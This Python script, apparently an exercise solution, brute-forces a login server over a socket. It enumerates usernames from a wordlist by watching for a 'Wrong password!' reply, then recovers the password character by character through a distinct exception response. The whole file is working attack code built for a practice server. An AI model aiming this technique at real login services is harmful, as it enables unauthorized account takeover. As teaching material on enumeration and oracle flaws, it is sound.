from argparse import ArgumentParser
from json import dumps, loads
from socket import socket
from string import ascii_letters, digits

LOGINS = (r'C:\Users\filip\OneDrive\PycharmProjects\Password Hacker (Python)'
          r'\logins.txt')

ALPHABET = ascii_letters + digits

WRONG_LOGIN = {'result': 'Wrong login!'}
WRONG_PASSWORD = {'result': 'Wrong password!'}
BAD_REQUEST = {'result': 'Bad request!'}
EXCEPTION = {'result': 'Exception happened during login'}
SUCCESS = {'result': 'Connection success!'}


class Address(tuple[str, int]):
    def __new__(cls):
        parser = ArgumentParser()
        parser.add_argument('ip')
        parser.add_argument('port', type=int)
        args = parser.parse_args()

        return super(Address, cls).__new__(cls, (args.ip, args.port))


class Credentials(dict[str: str, str: str]):
    def __init__(self, login: str, password: str):
        super().__init__({'login': login, 'password': password})

    def to_json(self, indent=None):
        return dumps(self, indent=indent)


def get_logins():
    with open(LOGINS) as f:
        logins = (line.strip() for line in f)
        yield from logins


def brute_force_login(client):
    for login in get_logins():
        credentials = Credentials(login, ' ')

        client.send(credentials.to_json().encode())
        response = client.recv(1024).decode()
        response = loads(response)

        if response == WRONG_PASSWORD:
            return login


def brute_force_password(client, login):
    password = []
    found = False
    while not found:
        for character in ALPHABET:
            candidate = ''.join(password) + character
            credentials = Credentials(login, candidate)

            client.send(credentials.to_json().encode())
            response = client.recv(1024).decode()
            response = loads(response)

            if response == EXCEPTION:
                password.append(character)
                break
            elif response == SUCCESS:
                return candidate


def main():
    address = Address()

    with socket() as client:
        client.connect(address)

        login = brute_force_login(client)
        password = brute_force_password(client, login)

    print(dumps(dict(login=login, password=password)))


if __name__ == "__main__":
    main()
